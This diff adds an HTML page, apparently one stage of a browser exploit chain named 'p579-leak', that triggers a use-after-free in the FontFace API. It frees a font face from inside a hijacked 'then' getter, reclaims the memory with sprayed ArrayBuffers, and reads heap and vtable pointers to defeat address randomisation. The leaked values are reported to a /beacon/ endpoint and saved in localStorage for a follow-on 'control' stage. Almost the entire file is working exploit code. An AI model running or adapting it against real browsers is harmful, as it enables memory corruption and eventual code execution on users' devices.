@@ -1,0 +1,130 @@
+<!--
+  p579-leak: Minimal cold boot FontFace UAF leak.
+  Exact p563 clone + localStorage save of T ONLY on success.
+  No localStorage read at startup (avoids storage subsystem init OOM).
+  v2: inline scan saves T before walk kills the process.
+  Extracts T (+0x58 = HashTable VA) and V (+0x00 = vtable/text base).
+
+  CRASH_CLASS: LOW
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p579 leak</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(m)+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+function readQ(v,o){
+  var lo=(v[o]|0)+((v[o+1]|0)<<8)+((v[o+2]|0)<<16)+((v[o+3]|0)*0x1000000);
+  var hi=(v[o+4]|0)+((v[o+5]|0)<<8)+((v[o+6]|0)<<16)+((v[o+7]|0)*0x1000000);
+  return [hi,lo];
+}
+function hexQ(hi,lo){return('00000000'+hi.toString(16)).slice(-8)+('00000000'+lo.toString(16)).slice(-8);}
+function hex(v){return('0'+v.toString(16)).slice(-2);}
+
+var K=16;
+
+function main(){
+  if(location.hash==='#reset'){
+    try{localStorage.removeItem('p579');}catch(e){}
+    b('P579L-RESET');
+    document.body.innerHTML='<p>Cleared.</p>';
+    return;
+  }
+
+  b('P579L-GO');
+
+  var A=new FontFace('fl','local(Helvetica)',{unicodeRange:'U+0041'});
+  document.fonts.add(A);
+  void A.loaded;
+  window.__alive=[A];
+
+  var styleEl=document.createElement('style');
+  styleEl.textContent="@font-face{font-family:sl;src:local(Arial);unicode-range:U+0042;}";
+  document.head.appendChild(styleEl);
+
+  var fired=false;
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      if(fired)return undefined;
+      fired=true;
+      if(styleEl)styleEl.remove();
+      try{document.fonts.delete(this);}catch(e){}
+      document.body.offsetHeight;
+      b('P579L-FREE');
+      window.__map=[];
+      for(var k=0;k<K;k++){
+        window.__map.push({view:new Uint8Array(new ArrayBuffer(192))});
+      }
+      b('P579L-SPRAY-'+K);
+
+      /* Inline scan — save T before the walk kills us */
+      for(var i=0;i<window.__map.length;i++){
+        var iv=window.__map[i].view,in_=0;
+        for(var j=0;j<iv.length;j++)if(iv[j]!==0)in_++;
+        if(in_>0){
+          var ip58=readQ(iv,0x58);
+          var ip00=readQ(iv,0x00);
+          b('P579L-INLINE-i='+i+'-n='+in_+'-T='+hexQ(ip58[0],ip58[1])+'-V='+hexQ(ip00[0],ip00[1]));
+          if(ip58[0]>=0x10||ip58[1]!==0){
+            try{localStorage.setItem('p579',JSON.stringify({
+              phase:'control',T:ip58,V:ip00,boots:1,ctrl:null,test:null,run:null
+            }));}catch(e){}
+            b('P579L-INLINE-SAVED');
+          }
+          break;
+        }
+      }
+
+      try{document.fonts.check('1em sl');}catch(e){}
+      return undefined;
+    },
+    set:function(){}
+  });
+
+  document.fonts.load('1em fl, sl','AB').then(function(){},function(){});
+
+  var done=false;
+  function scan(){
+    if(done)return;
+    var m=window.__map;if(!m)return;
+    for(var i=0;i<m.length;i++){
+      var v=m[i].view,n=0,first=-1;
+      for(var j=0;j<v.length;j++)if(v[j]!==0){n++;if(first<0)first=j;}
+      if(n>0){
+        done=true;
+        var p58=readQ(v,0x58);
+        var p00=readQ(v,0x00);
+        var p68=readQ(v,0x68);
+        var dump='';
+        var stop=Math.min(v.length,first+32);
+        for(var j=first;j<stop;j++)dump+=hex(v[j]);
+        b('P579L-HIT-i='+i+'-o='+first+'-n='+n+'-'+dump);
+        b('P579L-T='+hexQ(p58[0],p58[1])+'-V='+hexQ(p00[0],p00[1])+'-W='+hexQ(p68[0],p68[1]));
+
+        if(p58[0]>=0x10||p58[1]!==0){
+          try{localStorage.setItem('p579',JSON.stringify({
+            phase:'control',T:p58,V:p00,boots:1,ctrl:null,test:null,run:null
+          }));}catch(e){b('P579L-SAVE-ERR');}
+          b('P579L-STORED');
+          document.body.innerHTML='<p>LEAK OK. T='+hexQ(p58[0],p58[1])+
+            ' V='+hexQ(p00[0],p00[1])+
+            '<br>COLD BOOT REQUIRED. Load p579 v5 after power off/on.</p>';
+        }else{
+          b('P579L-BADPTR');
+        }
+        return;
+      }
+    }
+  }
+  setTimeout(scan,60);
+  setTimeout(scan,400);
+  setTimeout(scan,1000);
+  setTimeout(function(){
+    if(!done){done=true;b('P579L-NOLEAK');
+      document.body.innerHTML='<p>No leak. Cold boot required.</p>';}
+  },2000);
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive')setTimeout(main,0);
+else document.addEventListener('DOMContentLoaded',main);
+</script></head><body>
+<p>p579-leak — cold boot FontFace UAF</p>
+</body></html>
